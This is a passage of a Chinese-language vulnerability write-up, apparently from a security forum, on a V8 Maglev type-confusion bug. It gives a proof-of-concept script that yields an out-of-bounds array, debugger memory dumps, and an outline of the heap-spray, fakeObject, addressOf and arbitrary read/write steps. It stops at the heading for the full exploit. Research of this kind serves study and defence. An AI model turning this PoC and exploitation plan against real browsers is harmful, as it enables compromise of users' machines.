
```
pwndbg> job 0x3d840004c929
0x3d840004c929: [JS_OBJECT_TYPE]
- map: 0x3d840019b27d <Map[20](HOLEY_ELEMENTS)> [FastProperties]
- prototype: 0x3d8400184aa1 <Object map = 0x3d84001840dd>
- elements: 0x3d8400000219 <FixedArray[0]> [HOLEY_ELEMENTS]
- properties: 0x3d840004c9b5 <PropertyArray[3]>
- All own properties (excluding elements): {
0x3d840019ab75: [String] in OldSpace: #in_obj: 1 (const data field 0), location: in-object
0x3d840019ab89: [String] in OldSpace: #in_obj2: 2 (const data field 1), location: in-object
0x3d840019ab9d: [String] in OldSpace: #out1: 3 (const data field 2), location: properties[0]
0x3d840019abad: [String] in OldSpace: #out2: 4 (const data field 3), location: properties[1]
}
pwndbg> x/32wx 0x3d840004c929-1
0x3d840004c928:  0x0019b27d  0x0004c9b5  0x00000219  0x00000002
0x3d840004c938:  0x00000004  0x00000129  0x00010001  0x00000000
……
pwndbg> job 0x3d840004c9b5
0x3d840004c9b5: [PropertyArray]
- map: 0x3d84000009c9 <Map(PROPERTY_ARRAY_TYPE)>
- length: 3
- hash: 0
0: 3
1: 4
2: 0x3d8400000251 <undefined>
pwndbg> x/32wx 0x3d840004c9b5-1
0x3d840004c9b4:  0x000009c9  0x00000006  0x00000006  0x00000008
0x3d840004c9c4:  0x00000251  0x00000129  0x00040004  0x00000000
```

## 这里是 `JSArray` 对象的结构

![](https://bbs.kanxue.com/upload/attach/202507/971428_9YEA5TJU9N9S5QS.png)

### 示例代码

```
var arr = [1.1,2.2,3.3];
%DebugPrint(arr);
```

### 输出

```
pwndbg> job 0x9f20004c96d
0x9f20004c96d: [JSArray]
- map: 0x09f20018ece5 <Map[16](PACKED_DOUBLE_ELEMENTS)> [FastProperties]
- prototype: 0x09f20018e705 <JSArray[0]>
- elements: 0x09f20004c94d <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
- length: 3
- properties: 0x09f200000219 <FixedArray[0]>
- All own properties (excluding elements): {
0x9f200000e0d: [String] in ReadOnlySpace: #length: 0x09f200144a3d <AccessorInfo name= 0x09f200000e0d <String[6]: #length>, data= 0x09f200000251 <undefined>> (const accessor descriptor), location: descriptor
}
- elements: 0x09f20004c94d <FixedDoubleArray[3]> {
0: 1.1
1: 2.2
2: 3.3
}
pwndbg> x/16wx 0x9f20004c96d-1
0x9f20004c96c:  0x0018ece5  0x00000219  0x0004c94d  0x00000006
0x9f20004c97c:  0x00000000  0x00000000  0x00000000  0x00000000
0x9f20004c98c:  0x00000000  0x00000000  0x00000000  0x00000000
0x9f20004c99c:  0x00000000  0x00000000  0x00000000  0x00000000
```

因为使用 `Reflect.construct(Derived, [], Base);` 的时候无法创建 `in-object` 对象，所以这里混淆后的 `Length` 就只能为 0，但是别忘了还有 `gc`，我们可以主动触发 `gc`，这样会使用到一些地址上残留的值，这样就会有一个 `oob` 了。

因此下面是一个 poc：

```
var x = Array;

class Base {}

class Derived extends Base {
  constructor() {
    x = new.target;
    super();
  }
}

function construct() {
  var r = Reflect.construct(Derived, [], x);
  return r;
}

%PrepareFunctionForOptimization(Derived);
construct();
construct();
%OptimizeMaglevOnNextCall(Derived);

var arr = construct();
// console.log(arr.length);
%DebugPrint(arr);
```

因为 `chrome` 执行会默认带 `--maglev` 这个 flag，所以这里 `d8` 执行的时候需要加上 `--maglev`，下面是输出，可以看到 `length` 字段已经出来了。

```
➜  x64.release git:(11.5.150.16) ./d8 --allow-natives-syntax --maglev ./poc.js
DebugPrint: 0xf490004c9e9: [JSArray]
- map: 0x0f490018e4c1 <Map[16](PACKED_SMI_ELEMENTS)> [FastProperties]
- prototype: 0x0f490018e705 <JSArray[0]>
- elements: 0x0f4900000219 <FixedArray[0]> [PACKED_SMI_ELEMENTS]
- length: 0
- properties: 0x0f4900000219 <FixedArray[0]>
- All own properties (excluding elements): {
0xf4900000e0d: [String] in ReadOnlySpace: #length: 0x0f4900144a3d <AccessorInfo name= 0x0f4900000e0d <String[6]: #length>, data= 0x0f4900000251 <undefined>> (const accessor descriptor), location: descriptor
}
0xf490018e4c1: [Map] in OldSpace
- type: JS_ARRAY_TYPE
- instance size: 16
- inobject properties: 0
- elements kind: PACKED_SMI_ELEMENTS
- unused property fields: 0
- enum length: invalid
- back pointer: 0x0f4900000251 <undefined>
- prototype_validity cell: 0x0f4900000ab9 <Cell value= 1>
- instance descriptors #1: 0x0f490018ec71 <DescriptorArray[1]>
- transitions #1: 0x0f490018ec8d <TransitionArray[4]>Transition array #1:
0x0f4900000ed1 <Symbol: (elements_transition_symbol)>: (transition to HOLEY_SMI_ELEMENTS) -> 0x0f490018eca5 <Map[16](HOLEY_SMI_ELEMENTS)>
  - prototype: 0x0f490018e705 <JSArray[0]>
- constructor: 0x0f490018e42d <JSFunction Array (sfi = 0xf490014b375)>
- dependent code: 0x0f490004c979 <Other heap object (WEAK_ARRAY_LIST_TYPE)>
- construction counter: 0
```

> 方便查阅

有了一个 `oob` 的原语，下面的思路比较固定，我构造了这样的一个结构，首先堆喷一个 `victim_array`（用对象初始化），这样 `elements` 的地址相较于 `oob_array` 会相对稳定（笔者的机器信息见下方；这里 `oob_array` 的 `elements` 在笔者机器上的 `offset` 稳定为 `0x219`）。

接着利用 `oob_array` 的 `oob` 去修改 `victim_array` 的 `elements` 元素，布置伪造的 `map`（根据版本动态修改）和对象，然后布置这个 `fake_obj_addr`，便于后续伪造 `fake_object`，也就是一步到位直接有 `fakeObject` 原语了。

然后 `victim_array` 的 `elements` 首部可以布置一个 `obj`，这样方便写 `addressOf` 的原语，通过 `oob_array` 越界写。

![](https://bbs.kanxue.com/upload/attach/202507/971428_AWG546KNR9398TF.png)

## 笔者机器使用的环境

```
➜  x64.release git:(11.5.150.16) ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.10) 2.35
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
➜  x64.release git:(11.5.150.16) lsb_release -a
No LSB modules are available.
Distributor ID:  Ubuntu
Description:  Ubuntu 22.04.4 LTS
Release:  22.04
Codename:  jammy
```

## 遇到的一些问题

- 使用 `gdb` 调试的时候堆布局与直接使用 shell 运行不一样，最后笔者使用 `gdb attach` 解决了。
- 有了 `addressOf` 和 `fakeObject` 之后，AAR 和 AAW 的功能必须是通过一个一个语句实现，编写函数则无法成功，很奇怪的问题。
- 使用 `oob_array` 的越界读功能读到一些地址会 crash。一开始的思路是通过布置一个特征值，然后越界读，确定地址，然后接着后续利用，但是因为这个，所以暂时先放弃了（不过布置下堆，缩小遍历的范围，应该还是可行的）。
- `victim_array` 的 `elements` 因为是对象初始化的，所以索引的时候应该是 `offset/4`。

## exp

> 笔者机器上，堆喷射后 `victim_array` 的 `elements` 地址只有这两个情况：`0x2423cd` 和 `0x2423e9`。
